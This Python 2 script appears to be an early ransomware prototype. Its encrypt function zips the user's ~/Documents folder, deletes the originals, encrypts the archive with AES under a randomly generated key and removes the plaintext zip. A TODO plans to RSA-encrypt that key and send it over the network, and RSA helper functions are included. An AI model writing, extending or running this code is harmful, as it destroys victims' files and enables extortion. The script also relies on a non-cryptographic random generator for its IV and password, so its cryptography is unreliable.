# -*- coding: utf-8 -*-


'''
TODO: Encrypt password using RSA and send it over network
        with a new public key.
'''

import os, random, struct, string
from Crypto.Cipher import AES
from pbkdf2 import PBKDF2
from zip import zipdir

def generate_RSA(bits=2048):
    '''
    Generate an RSA keypair with an exponent of 65537 in PEM format
    param: bits The key length in bits
    Return private key and public key
    '''
    from Crypto.PublicKey import RSA 
    new_key = RSA.generate(bits, e=65537) 
    public_key = new_key.publickey().exportKey("PEM") 
    private_key = new_key.exportKey("PEM") 
    return private_key, public_key

def randomword(length):
    chars = string.lowercase+string.digits+string.uppercase
    return ''.join(random.choice(chars) for i in range(length))

def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
    """ Encrypts a file using AES (CBC mode) with the
        given key.

        key:
            The encryption key - a string that must be
            either 16, 24 or 32 bytes long. Longer keys
            are more secure.

        in_filename:
            Name of the input file

        out_filename:
            If None, '<in_filename>.enc' will be used.

        chunksize:
            Sets the size of the chunk which the function
            uses to read and encrypt the file. Larger chunk
            sizes can be faster for some files and machines.
            chunksize must be divisible by 16.
    """
    if not out_filename:
        out_filename = in_filename + '.enc'

    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))

def decrypt_file(key, in_filename, out_filename=None, chunksize=24*1024):
    """ Decrypts a file using AES (CBC mode) with the
        given key. Parameters are similar to encrypt_file,
        with one difference: out_filename, if not supplied
        will be in_filename without its last extension
        (i.e. if in_filename is 'aaa.zip.enc' then
        out_filename will be 'aaa.zip')
    """
    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]

    with open(in_filename, 'rb') as infile:
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
        iv = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, iv)

        with open(out_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))

            outfile.truncate(origsize)


def encrypt_RSA(public_key_loc, message):
    '''
    param: public_key_loc Path to public key
    param: message String to be encrypted
    return base64 encoded encrypted string
    '''
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_OAEP
    key = open(public_key_loc, "r").read()
    rsakey = RSA.importKey(key)
    rsakey = PKCS1_OAEP.new(rsakey)
    encrypted = rsakey.encrypt(message)
    return encrypted.encode('base64')

def decrypt_RSA(private_key_loc, package):
    '''
    param: public_key_loc Path to your private key
    param: package String to be decrypted
    return decrypted string
    '''
    from Crypto.PublicKey import RSA 
    from Crypto.Cipher import PKCS1_OAEP 
    from base64 import b64decode 
    key = open(private_key_loc, "r").read() 
    rsakey = RSA.importKey(key) 
    rsakey = PKCS1_OAEP.new(rsakey) 
    decrypted = rsakey.decrypt(b64decode(package)) 
    return decrypted

def clearFolder(path):
    import shutil
    import os 
    if len(os.listdir(path)) > 0:
        for the_file in os.listdir(path):
            file_path = os.path.join(path, the_file)
            try:
                if os.path.isfile(file_path):
                    os.unlink(file_path)
                else:
                    shutil.rmtree(file_path, ignore_errors=True)
            except Exception, e:
                print e
        return False
    else:
        return True

def encrypt(path=""):
    from os.path import expanduser
    home = expanduser("~")
    path = home + "/Documents"
    zipPath = home + "/Documents.zip"

    zipdir(path,zipPath)

    empty = clearFolder(path)

    if empty:
        return "already encrypted"

    password = randomword(64)
    salt = os.urandom(8)
    key = PBKDF2(password,salt).read(32)
    encrypt_file(key,zipPath)
    os.unlink(zipPath)

    return key

def decrypt(key):
    from os.path import expanduser
    home = expanduser("~")
    path = home + "/Documents.zip.enc"
    decrypt_file(key,path)

if __name__ == '__main__':
    # print "asdf"
    # print encrypt()
    # from os.path import expanduser
    # home = expanduser("~")
    # clearFolder(home + "\Documents")
    # decrypt("]─₧↕‼♠:.{W║ú>÷bm₧⌂p∞≤ìù☻ci╤lß╨░T")
    print generate_RSA()